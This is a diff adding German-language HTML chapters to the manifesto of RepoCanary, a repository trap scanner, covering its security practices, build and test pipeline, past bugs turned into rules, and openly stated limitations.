+    <tr><td>Schlüssel</td><td>Nie als Argument, eingefügt unsichtbar, nur für einen Lauf im Speicher, nie auf der Festplatte und nie im Bericht.</td></tr>
+    <tr><td>Website</td><td>Kein Konto, keine Cookies, keine Analyse, nichts auf der Festplatte. Der geprüfte Link geht nur an GitHub.</td></tr>
+    <tr><td>Lieferkette</td><td>Keine Laufzeit-Abhängigkeiten. Abhängigkeiten der Website werden bei jedem Push auf bekannte hohe Lücken geprüft. Actions sind auf Commit-Hashes festgelegt.</td></tr>
+    <tr><td>Veröffentlichen</td><td>Nur von einem Tag auf der Hauptlinie, nach derselben Prüfstrecke wie die CI, mit Freigabe durch eine Person und Herkunftsnachweis. Ein Token zum Veröffentlichen existiert nicht.</td></tr>
+    <tr><td>Meldestelle</td><td>Sicherheitslücken vertraulich über den Security-Tab des Repositorys, Erkennungslücken als gewöhnliches Issue mit dem Link.</td></tr>
+  </table>
+  <p>Die Website hängt an einer Webanwendung mit eigenen Abhängigkeiten. Als im November&nbsp;2026 kritische Sicherheitshinweise für das Framework der Website erschienen, wurde es aktualisiert. Die Kommandozeile war davon nicht betroffen, sie hat keine Abhängigkeiten. Eine Prüfung durch Dritte gibt es nicht (Kapitel&nbsp;12).</p>
+</section>
+
+<!-- 11 -->
+<section class="sec pb" id="gebaut">
+  <div class="num">11</div>
+  <h2>Wie es gebaut wird</h2>
+  <p class="lead">Die Arbeit begann am 24.&nbsp;Juli 2026 in einem privaten Repository, mit über 300 Commits und 50 zusammengeführten Pull Requests. Öffentlich ist der Code seit dem 27.&nbsp;September 2026.</p>
+  <div class="miles">
+    <div><b>24.&nbsp;Juli 2026</b><span>Erster Commit: ein statischer Scanner für Fallen in GitHub-Repositories</span></div>
+    <div><b>24.&nbsp;Sept. 2026</b><span>Messung auf 4.002 nie gesehenen Repositories abgeschlossen</span></div>
+    <div><b>27.&nbsp;Sept. 2026</b><span>Erste Version auf npm und auf GitHub, am selben Tag die erste Korrektur</span></div>
+    <div><b>12.&nbsp;Okt. 2026</b><span>Abhängigkeiten der Website wegen hoher Sicherheitshinweise aktualisiert</span></div>
+    <div><b>10.&nbsp;Nov. 2026</b><span>Framework der Website nach kritischen Sicherheitshinweisen aktualisiert</span></div>
+  </div>
+  <p>Gebaut und betreut wird RepoCanary von Chris Zemmel.</p>
+  <h3>Die Prüfstrecke</h3>
+  {{FIG:gates|Abb. 11|Jeder Push und jeder Pull Request durchläuft dieselben Schritte. Wöchentlich kommen der Wächter mit jedem bestätigten Rot und der ganze Korpus dazu. Veröffentlicht wird nur nach derselben Prüfstrecke, von einem Tag auf der Hauptlinie, mit Freigabe durch eine Person.}}
+  <ul class="tight">
+    <li><b>Offline-Tests.</b> Über 750 Tests in über 20 Dateien laufen in rund 25&nbsp;Sekunden ohne Netz und ohne Installation. Die Zeilenabdeckung des Engine-Codes liegt über 95&nbsp;Prozent.</li>
+    <li><b>Referenzberichte.</b> Text-, JSON- und SARIF-Ausgabe werden Byte für Byte mit festen Berichten verglichen.</li>
+    <li><b>Der Wächter.</b> Die meisten Korrekturen engen eine Regel ein, damit ein falsches Rot verschwindet, und jede davon kann nur Erkennung kosten. Der Wächter prüft deshalb jedes Beispiel, jede dokumentierte Umgehung und jedes bestätigte Rot: Nichts, was einmal gefangen wurde, darf durchrutschen.</li>
+    <li><b>Website.</b> Über 40 eigene Tests, Typprüfung und Build in einem eigenen Schritt, weil die Seite die Engine direkt importiert.</li>
+  </ul>
+  <h3 class="pb-before">Fehler, die zu Regeln wurden</h3>
+  <table class="tbl cases">
+    <tr><th>Fall</th><th>Was geschah</th><th>Regel seitdem</th></tr>
+    <tr><td>Der Download im Kommentar</td><td>Ein Download in einem Kommentar, einem Hilfetext oder einer Zeichenkette ergab Rot.</td><td>Ein Text ist nur dort ein Befehl, wo er eine Shell erreicht.</td></tr>
+    <tr><td>Das Werkzeug, das niemand startet</td><td>Ein Wartungsskript, das herunterlädt, machte ehrliche Projekte rot.</td><td>Rot braucht etwas, das von selbst läuft. Sonst höchstens eine Vorsicht.</td></tr>
+    <tr><td>Das doppelte Budget</td><td>Die Website zog pro Scan zweimal vom Kontingent ab und auch für zwischengespeicherte Antworten.</td><td>Genau eine Einheit pro echtem Scan, keine für eine gespeicherte Antwort, mit Test.</td></tr>
+    <tr><td>Die gekürzte Zahl</td><td>Die KI erhielt die Länge der gekürzten Befundliste statt der wahren Zahl.</td><td>Die KI bekommt die wahre Zahl der Befunde.</td></tr>
+    <tr><td>Das zu große Versprechen</td><td>Die Dokumentation sagte „nie heruntergeladen“, obwohl Dateien in den Speicher gelesen werden.</td><td>Aussagen werden gegen den Code geprüft: „nie ausgeführt oder gespeichert“.</td></tr>
+    <tr><td>Das ungeprüfte Paket</td><td>Vor dem Veröffentlichen liefen nur die Tests, nicht der Lint für „null Abhängigkeiten“ und nicht der Wächter.</td><td>Veröffentlicht wird nur nach derselben Prüfstrecke wie in der CI.</td></tr>
+  </table>
+</section>
+
+<!-- 12 -->
+<section class="sec pb" id="grenzen">
+  <div class="num">12</div>
+  <h2>Grenzen heute</h2>
+  <p class="lead">Ein Manifest, das seine Grenzen verschweigt, verdient kein Vertrauen. RepoCanary ist ein Rauchmelder, kein Schutzschild.</p>
+  <div class="limits">
+    <div><h4>Nur Bekanntes in Dateien</h4><p>Nutzlast, die erst zur Laufzeit von einem Server kommt, eine kompromittierte Abhängigkeit, die normal aus der Registry kommt, und neue Techniken ohne Regel können grün durchgehen.</p></div>
+    <div><h4>Angriffe ohne Code</h4><p>Anweisungen per Chat, die Bitte, einen fremden CI-Runner einzurichten, oder eine Bitte an einen KI-Agenten in gewöhnlicher Sprache liegen außerhalb dessen, was ein Dateiscan sehen kann.</p></div>
+    <div><h4>Nicht alles wird gelesen</h4><p>Binärdateien, Submodule und Ziele symbolischer Links liest RepoCanary nicht, und große Repositories nur zum Teil. Jeder solche Fall steht als Hinweis im Bericht.</p></div>
+    <div><h4>Rot trifft auch Ehrliche</h4><p>Gemessen trifft Rot etwa jedes 36. ehrliche Repository im schweren Pool. Wer Rot sieht, liest den Befund, bevor er urteilt.</p></div>
+    <div><h4>Keine echte Erkennungsrate</h4><p>Der Katalog ist eine Absicherung gegen Rückschritte. Eine Messung an Schadcode von Dritten mit eingefrorenen Regeln steht aus.</p></div>
+    <div><h4>Kein externes Audit</h4><p>Die Website ist nicht Zeile für Zeile geprüft, der GitHub-Client nicht mit feindlichen API-Antworten gefuzzt, die KI-Zweitmeinung nicht gegen Text getestet, der das Modell manipulieren soll. Eine Person baut und betreut das Projekt.</p></div>
+  </div>
+  <div class="unver">
+    <div class="label">Was nicht geprüft ist</div>
+    <p class="small" style="margin-bottom:2mm">„Nicht geprüft“ ist ein gültiger Stand. Diese Punkte stehen in den Quellen, wurden für dieses Manifest aber nicht gegen die Wirklichkeit nachgeprüft:</p>
+    <ul>
+      <li>Die Zahlen aus Kapitel&nbsp;9 (Wellen, falsche Rote, Korpus, 71 Projekte, 19 Fallen, schlimmster Fall von 2,4&nbsp;Sekunden) stammen aus der Messung des Projekts bis September 2026. Wiederholt wurde sie für dieses Manifest nicht. Die Fallen wurden nicht einzeln nachgeprüft.</li>
+      <li>Die zwei Rückschritte, die der wöchentliche Korpuslauf fand, sind nur in der Beschreibung des Workflows belegt.</li>
+      <li>Die Zahl der Commits und Pull Requests im privaten Entwicklungs-Repository lässt sich öffentlich nicht nachprüfen.</li>
+      <li>Nachgeprüft sind die 750+ Offline-Tests, die 40+ Tests der Website, die Abdeckung und der aktuelle Katalog: Sie liefen für dieses Manifest grün. Das rote Ergebnis auf den Bildschirmfotos ist die Offline-Prüfung des Beispiels im Repository, eingespielt in die echte Website. Startseite, grünes Beispiel und Katalog sind live.</li>
+      <li>Wie die Website im Betrieb verfügbar war, ist nicht gemessen.</li>
+    </ul>
+  </div>
+  <div class="contact">
+    {{LOGO:44}}
+    <div class="contact-body">
+      <div class="label">Kontakt</div>
+      <p class="contact-line"><span class="contact-name">Chris Zemmel</span> Zyric · repocanary.com · github.com/chriszemmel/repocanary</p>
+    </div>
+    <p class="contact-note small">RepoCanary ist freie Software unter der MIT-Lizenz.</p>
+  </div>
+</section>
